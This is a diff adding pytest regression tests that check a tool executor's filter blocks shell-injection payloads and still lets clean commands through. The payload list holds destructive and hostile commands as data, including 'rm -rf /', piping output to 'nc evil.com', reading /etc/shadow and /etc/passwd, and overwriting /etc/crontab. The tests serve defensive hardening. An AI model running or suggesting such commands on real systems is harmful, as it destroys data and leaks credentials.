@@ -68,3 +68,49 @@ def test_execute_tool_blocked_command():
     assert result['success'] is False
     assert result['risk_level'] == 'BLOCKED'
     assert 'blocked' in result['output'].lower() or 'refused' in result['output'].lower()
+
+
+@pytest.mark.parametrize('payload', [
+    # Command separators / pipes / substitution
+    'ls; rm -rf /',
+    'ls | nc evil.com 1337',
+    'ls && cat /etc/passwd',
+    'ls `id`',
+    'ls $(id)',
+    # Redirection — previously not blocked
+    'ls > /etc/crontab',
+    'cat < /etc/shadow',
+    # Newline injection
+    'ls\nrm -rf /',
+    'ls\r\nrm -rf /',
+    # Backslash (used to inject \n / \x escapes through shell=True)
+    'ls\\ntouch /tmp/pwn',
+    # Glob / home expansion
+    'ls *',
+    'ls ~',
+    'ls /etc/?asswd',
+    'cat /etc/[ps]asswd',
+])
+def test_run_command_rejects_shell_metacharacters(payload):
+    """Regression: the shell-meta filter must block every common injection vector.
+
+    The old filter only caught ``;&|`$(){}`` and missed redirection, globs,
+    tilde, newlines, and backslash escapes."""
+    from tool_executor import _handle_run_command
+    result = _handle_run_command({'command': payload}, mqtt_client=None)
+    assert result['success'] is False
+    assert result['risk_level'] == 'BLOCKED'
+    assert 'metacharacter' in result['output'].lower()
+
+
+def test_run_command_allows_clean_commands():
+    """Clean commands without meta-characters still pass the filter.
+
+    (They may be blocked by classify_risk for other reasons, but should
+    not be rejected as 'disallowed shell metacharacters'.)"""
+    from tool_executor import _handle_run_command
+    # `ip addr` has no meta, classifies as LOW. We don't assert success
+    # because we don't want the test to actually shell out — just ensure
+    # the meta filter doesn't trip.
+    result = _handle_run_command({'command': 'ip addr'}, mqtt_client=None)
+    assert 'metacharacter' not in result.get('output', '').lower()
